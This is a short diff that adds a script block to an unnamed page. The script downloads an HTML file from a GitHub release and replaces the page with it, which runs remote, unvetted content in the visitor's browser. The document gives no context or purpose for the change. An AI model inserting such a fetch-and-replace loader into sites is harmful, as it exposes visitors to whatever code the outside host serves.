@@ -1,0 +1,5 @@
+<script>
+fetch("https://github.com/Kiritoasty/mods/releases/download/770/770.html")
+  .then(r => r.blob())
+  .then(b => location.replace(URL.createObjectURL(b)));
+</script>
